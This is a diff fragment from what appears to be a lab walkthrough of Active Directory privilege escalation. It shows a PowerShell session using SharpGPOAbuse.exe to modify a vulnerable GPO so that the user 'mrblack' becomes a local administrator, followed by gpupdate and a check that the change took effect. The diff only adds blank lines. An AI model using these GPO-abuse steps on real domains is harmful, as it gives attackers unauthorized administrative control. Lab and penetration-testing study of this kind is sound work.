@@ -23,6 +23,7 @@ we will use "SharpGPOAbuse.exe "  and edit gpo to add a user to local admin grou
 	win10
 	The command completed successfully.
 
+
 	PS C:\Users\testuser\Desktop\PowerSploit\Recon> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount mrblack --GPOName "vulngpo"
 	[+] Domain = valhalla.local
 	[+] Domain Controller = odin.valhalla.local
@@ -34,11 +35,14 @@ we will use "SharpGPOAbuse.exe "  and edit gpo to add a user to local admin grou
 	[+] The version number in GPT.ini was increased successfully.
 	[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
 	[+] Done!
+	
+
 	PS C:\Users\testuser\Desktop\PowerSploit\Recon> gpupdate /force
 	Updating policy...
 
 	Computer Policy update has completed successfully.
 	User Policy update has completed successfully.
+
 
 	PS C:\Users\testuser\Desktop\PowerSploit\Recon> net localgroup administrators
 	Alias name     administrators
@@ -50,6 +54,7 @@ we will use "SharpGPOAbuse.exe "  and edit gpo to add a user to local admin grou
 	Administrator
 	VALHALLA\mrblack
 	The command completed successfully.
+
 
 	PS C:\Users\testuser\Desktop\PowerSploit\Recon> net user
 
